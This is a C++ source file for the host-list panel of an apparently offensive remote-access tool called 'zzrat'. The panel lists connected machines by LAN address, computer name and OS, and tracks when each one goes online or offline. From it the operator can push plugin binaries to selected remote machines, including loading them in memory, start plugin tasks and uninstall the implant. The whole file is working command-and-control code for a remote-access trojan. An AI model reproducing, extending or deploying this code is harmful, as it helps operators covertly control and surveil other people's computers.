/*
 * Copyright (c) 2024, zz
 * All rights reserved.
 *
 * Author: zz <3875657991@qq.com>
 */

#include "plugins/host/host_view.h"

#include <fstream>

#include "client/win/imgui_logger.h"
#include "manager/view_manager.h"
#include "manager/setting_manager.h"
#include "imgui_internal.h"

#include <utility>
#include <string>
#include <client/resource/font/IconsFontAwesome6.h>


void HostView::draw() {
    if (!open_){
        getTaskRunner()->postQuit();
        return;
    }

    ImGuiWindowFlags window_flags  = 0;
    if(ImGui::Begin("zzrat", &open_, window_flags)) {
        drawTable();
        drawStatusBar();
    }
    ImGui::End();
}

void HostView::onTaskDone(Task task) {
    int command = task["command"];
    int session_id = task["session_id"];
    switch (command) {
        case ONLINE: {
            getHostInfo(session_id);
            return;
        }
        case OFFLINE: {
            onOffline(session_id);
            return;
        }
        case RPC: {
            View::onTaskDone(task);
            return;
        }
        default: break;
    }
}

void HostView::getHostInfo(int session_id) {
    call(session_id, kHostInfoPlugin, "getHostInfo", [session_id, this](std::error_code, std::string_view result) {
        auto sys_info = as<HostInfo>(result);
        IMGUI_INFO_FMT("[%04d] %s %s online", session_id, sys_info.lan.c_str(), sys_info.computer.c_str());
        servers_[session_id] = std::move(sys_info);
    });
}

void HostView::onOffline(int session_id) {
    servers_.erase(session_id);
    IMGUI_INFO_FMT("[%04d] offline", session_id);

    std::vector<int> view_ids;
    for (auto& [id, obj] : ViewManager::views) {
        if (obj->getSessionId() == session_id) {
            view_ids.push_back(id);
        }
    }

    for (auto id: view_ids) {
        ViewManager::views.erase(id);
    }
}

void HostView::drawTable() {
    if (ImGui::BeginTable("server_table", 5)) {
        ImGui::TableSetupColumn("ID");
        ImGui::TableSetupColumn("LAN");
        ImGui::TableSetupColumn("Computer");
        ImGui::TableSetupColumn("OS");
        ImGui::TableSetupColumn("Time");
        ImGui::TableHeadersRow();

        static ImVector<int> selection;
        ImGui::PushButtonRepeat(true);
        for(auto& [id, info]: servers_){
            const bool item_is_selected = selection.contains(id);
            ImGui::TableNextRow(ImGuiTableRowFlags_None, 2);
            ImGui::PushID(id);

            ImGui::TableSetColumnIndex(0);
            std::string label = std::to_string(id);
            ImGuiSelectableFlags selectable_flags =
                    ImGuiSelectableFlags_SpanAllColumns | ImGuiSelectableFlags_AllowOverlap;
            if (ImGui::Selectable(label.c_str(), item_is_selected, selectable_flags)) {
                if (ImGui::GetIO().KeyCtrl) {
                    if (item_is_selected)
                        selection.find_erase_unsorted(id);
                    else
                        selection.push_back(id);
                } else {
                    selection.clear();
                    selection.push_back(id);
                }
            }

            if (item_is_selected && ImGui::BeginPopupContextItem()) {
                auto &menus = ViewManager::factory;
                for (auto& [name, fun] : menus){
                    if(name != kHostInfoPlugin) {
                        if(ImGui::MenuItem(name.c_str()))
                            doMenuTasks(name, selection);
                    }
                }
                if(ImGui::MenuItem(("Uninstall"))){
                    doUninstall(selection);
                }
                ImGui::EndPopup();
            }

            if (ImGui::TableSetColumnIndex(1))
                ImGui::TextUnformatted(info.lan.c_str());
            if (ImGui::TableSetColumnIndex(2))
                ImGui::TextUnformatted(info.computer.c_str());
            if (ImGui::TableSetColumnIndex(3))
                ImGui::TextUnformatted(info.os.c_str());
            if (ImGui::TableSetColumnIndex(4))
                ImGui::TextUnformatted(info.online_time.c_str());
            ImGui::PopID();
        }
        ImGui::PopButtonRepeat();
        ImGui::EndTable();
    }
}


void HostView::drawStatusBar() {

    auto* viewport = ImGui::GetMainViewport();
    ImGuiWindowFlags window_flags = ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoSavedSettings | ImGuiWindowFlags_MenuBar;
    float height = ImGui::GetFrameHeight();

    if (ImGui::BeginViewportSideBar("##MainStatusBar", viewport, ImGuiDir_Down, height, window_flags)) {
        if (ImGui::BeginMenuBar()) {
            if (ImGui::BeginTable("##footer_table", 3, ImGuiTableFlags_SizingFixedFit)) {
                ImGui::TableSetupColumn("Left", ImGuiTableColumnFlags_WidthStretch, 0.5F);
                ImGui::TableSetupColumn("Center", ImGuiTableColumnFlags_WidthStretch, 0.5F);
                ImGui::TableSetupColumn("Right", ImGuiTableColumnFlags_WidthStretch, 0.5F);
                ImGui::TableNextRow();

                ImGui::TableSetColumnIndex(0);
                ImGui::Text("listen: %zu", listen_port_);

                ImGui::TableNextColumn();
                ImGui::Text("online: %zu", servers_.size());

                ImGui::TableNextColumn();
                ImGui::Text("FPS: %.1f", ImGui::GetIO().Framerate);
            }
            ImGui::EndTable();
            ImGui::EndMenuBar();
        }
        ImGui::End();
    }
}

std::vector<char> readBinaryFile(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary);
    if (!file) {
        throw std::runtime_error("Could not open file");
    }

    // 获取文件大小
    file.seekg(0, std::ios::end);
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    // 读取文件内容
    std::vector<char> buffer(size);
    if (!file.read(buffer.data(), size)) {
        throw std::runtime_error("Failed to read file");
    }

    return buffer;
}

void HostView::doMenuTasks(const std::string& name, const ImVector<int> &selection) {
    auto checkAndLoadPlugin = [this, name](int session_id) {
        call(session_id, kHostInfoPlugin, "checkPlugin",
            [session_id, name, this](std::error_code, std::string_view result) {
                if (!as<bool>(result)) {
                    auto it = plugins_.find(name);

                    auto data = readBinaryFile(plugins_[name]);
                    call(session_id, kHostInfoPlugin, "loadPlugin",
                        [session_id, name, this](std::error_code, std::string_view result) {
                            ZLOG_ERROR << "plugin" << name << "install " << as<bool>(result);
                            startMenuTasks(name, session_id);
                        }, name, data);
                } else {
                    startMenuTasks(name, session_id);
                }
            }, name);
    };

    for (auto session_id : selection) {
#ifndef MEMORYLOAD
        startMenuTasks(name, session_id);
#else
        checkAndLoadPlugin(session_id);
#endif
    }
}

void HostView::startMenuTasks(const std::string &name, int session_id) {
    if(auto new_id = ViewManager::create(name)){
        auto &new_view = ViewManager::views[new_id];
        auto task_producer = getTaskProducer();
        new_view->setSessionId(session_id);
        new_view->setTaskProducer(task_producer);
        new_view->setTaskRunner(getTaskRunner());
        new_view->start();
    }
}

void HostView::doUninstall(const ImVector<int> &selection) {
    for(auto session_id: selection) {
        call(session_id, kHostInfoPlugin, "uninstall", [session_id, this](std::error_code, std::string_view result) {

        });
    }
}
